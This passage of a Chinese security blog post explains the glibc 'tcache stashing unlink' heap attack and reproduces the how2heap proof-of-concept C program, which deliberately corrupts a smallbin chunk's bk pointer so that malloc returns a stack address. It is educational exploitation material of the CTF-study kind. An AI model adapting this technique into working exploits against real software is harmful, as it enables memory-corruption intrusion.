+<p>tcache stashing unlink atttack 主要利用的是 calloc 函数会绕过 tcache 从smallbin 里取出 chunk 的特性。</p>
+<p>由于smallbin 分配后，同大小的空闲块挂进会 tcache。且只有第一个chunk脱链时进行了链表完整性检查</p>
+<p>攻击可实现两个效果：</p>
+<p>1、任意地址上写一个main_area地址</p>
+<p>2、任意地址分配chunk(构造合适)</p>
+<p>实现第二种效果时</p>
+<p>假设calloc之前smallbin中</p>
+<p>FD:main_area-&gt;chunk2-&gt;chunk1</p>
+<p>我们将chunk2的bk改为fakechunk1,然后修改fakechunk1的bk为fake2，则BK:fakechunk2&lt;-fakechunk1&lt;-chunk2&lt;-chunk1&lt;-main_area</p>
+<p>calloc分配chunk1给用户，chunk2脱链进入tcache_bin,然后fake_chunk1进入tcache ，fakechunk2-&gt;fd=main_area</p>
+<p>如果不修改fakechunk1的bk为一个可写地址(fake_chunk2)，则</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">bck</span> <span class="o">=</span> <span class="n">tc_victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span> <span class="o">//</span> <span class="n">这里取tc_victim的bk指针</span><span class="err">，</span><span class="n">并没有针对bck做双向链表完整性检查</span><span class="err">，</span><span class="n">因此我们可以去攻击tc_victim的bk指针</span>
+</span></span><span class="line"><span class="cl">              <span class="n">set_inuse_bit_at_offset</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">              <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">set_non_main_arena</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">              <span class="nb">bin</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span> <span class="o">//</span> <span class="n">将tc_victim从small</span> <span class="n">bin中脱链</span>
+</span></span><span class="line"><span class="cl">              <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">;</span> <span class="o">/</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的bck不可写，fake_chunk1无法脱链</p>
+<p><a class="link" href="https://blog.csdn.net/Mr_Fmnwon/article/details/142649778"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/Mr_Fmnwon/article/details/142649778</a></p>
+<p>这篇文章图画的很详细</p>
+<h2 id="how2heap例子">how2heap例子
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#include &lt;stdio.h&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;stdlib.h&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;assert.h&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">int</span> <span class="n">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">unsigned</span> <span class="n">long</span> <span class="n">stack_var</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">unsigned</span> <span class="n">long</span> <span class="o">*</span><span class="n">chunk_lis</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">unsigned</span> <span class="n">long</span> <span class="o">*</span><span class="n">target</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;这个文件演示了tcache上的stashing unlink攻击。</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;这个poc已经在glibc-2.27、glibc-2.29和glibc-2.31上测试过。</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;当你能够覆盖victim-&gt;bk指针时，可以使用这个技术。此外，至少需要使用calloc分配一次chunk。最后，我们需要一个可写地址来绕过glibc中的检查。</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;在glibc中将smallbin放入tcache的机制给了我们发动攻击的机会。</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;这个技术允许我们将libc地址写到我们想要的任何地方，并在我们需要的地方创建一个假的chunk。在这个案例中，我们将在堆栈上创建这个chunk。</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="n">stack_var模拟我们想要分配的fake_chunk</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;stack_var模拟我们想要分配的fake chunk。</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;首先，我们将一个可写地址写入fake_chunk-&gt;bk以绕过glibc中的bck-&gt;fd = bin检查。这里我们选择stack_var[2]的地址作为假的bk。稍后我们可以看到*(fake_chunk-&gt;bk + 0x10)，也就是stack_var[4]将在攻击后成为libc地址。</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">stack_var</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">unsigned</span> <span class="n">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;你可以看到fake_chunk-&gt;bk的值是:%p</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">,(</span><span class="n">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;同时，让我们看看stack_var[4]的初始值:%p</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">,(</span><span class="n">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;现在我们用malloc分配9个chunks。</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">现在我们分配9个chunks</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="nb">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunk_lis</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">unsigned</span> <span class="n">long</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">将7个chunks放入tcache</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;然后我们释放其中7个以将它们放入tcache。我们小心地没有按序释放chunk2到chunk9，因为相邻的unsorted bin会在另一个malloc之后合并。</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="nb">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">free</span><span class="p">(</span><span class="n">chunk_lis</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;正如你所见，chunk1和[chunk3,chunk8]被放入tcache bins，而chunk0和chunk2将被放入unsorted bin。</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">最后一个tcache</span> <span class="nb">bin</span>
+</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">chunk_lis</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">现在它们被放入unsorted</span> <span class="nb">bin</span>
+</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">chunk_lis</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">chunk_lis</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">转换为small</span> <span class="nb">bin</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;现在我们分配一个大于0x90的chunk以将chunk0和chunk2放入small bin。</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">malloc</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">);</span><span class="o">//</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x90</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">现在5个tcache</span> <span class="n">bins</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;然后我们分配两个chunk以腾出small bins的空间。之后，我们现在有5个tcache bins和2个small bins。</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;现在我们模拟一个可以覆盖victim-&gt;bk指针到fake_chunk地址: %p的漏洞。</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">,(</span><span class="n">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">更改victim</span><span class="o">-&gt;</span><span class="n">bck</span>
+</span></span><span class="line"><span class="cl">    <span class="o">/*</span><span class="n">VULNERABILITY</span><span class="o">*/</span>
+</span></span><span class="line"><span class="cl">    <span class="n">chunk_lis</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">unsigned</span> <span class="n">long</span><span class="p">)</span><span class="n">stack_var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">/*</span><span class="n">VULNERABILITY</span><span class="o">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">触发攻击</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;最后我们用calloc分配一个0x90的chunk以触发攻击。之前释放的小bin将返回给用户，另一个和fake_chunk被链接到tcache bins。</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x90</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;现在我们的fake chunk已经被放入tcache bin[0xa0]列表。它的fd指针现在指向下一个空闲chunk: %p，而bck-&gt;fd已经被更改为一个libc地址: %p</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">,(</span><span class="n">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">2</span><span class="p">],(</span><span class="n">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">分配并返回我们的fake</span> <span class="n">chunk在堆栈上</span>
+</span></span><span class="line"><span class="cl">    <span class="n">target</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;正如你所见，下一次malloc(0x90)将返回我们的fake chunk区域: %p</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,(</span><span class="n">void</span><span class="o">*</span><span class="p">)</span><span class="n">target</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/pwn/">Pwn</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-botcake/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_botcake.jpg" loading="lazy" data-key="" data-hash="/image/House_of_botcake.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of botcake</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/tcache-bin%E5%AD%A6%E4%B9%A0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/tcache.jpg" loading="lazy" data-key="" data-hash="/image/tcache.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">tcache bin学习</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%88%9D%E8%AF%86io/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/iostart/iostart2.jpg" loading="lazy" data-key="" data-hash="/image/iostart/iostart2.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">初识IO</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-orangefsop/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_orange.png" loading="lazy" data-key="" data-hash="/image/House_of_orange.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of orange&amp;&amp;FSOP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-husk34c3ctf-readme_revenge/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/husk/House_of_husk.jpg" loading="lazy" data-key="" data-hash="/image/husk/House_of_husk.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of husk&amp;&amp;34c3CTF readme_revenge</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 chang
+    </section>
+    
+    <section class="powerby">
+        
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.a2bdfcd44ef572203220652568b318b0d339e1b66627df894cad45601e4caa56.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+     
+    background: url("/background/Ai.jpg") no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+     
+    margin: 0;  
+    min-height: 100vh;  
+  }
+
+ 
+  .container {
+    position: relative;
+  }
+  .container::before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #fda2e363; 
+    z-index: -1; 
+  }  
+
+
+
+
+  
+
+
+</style>
+<script src="/background/sakura.js"></script>
+
+
+
+<script defer src="https://cn.vercount.one/js"></script>
+
+    </body>
+</html>
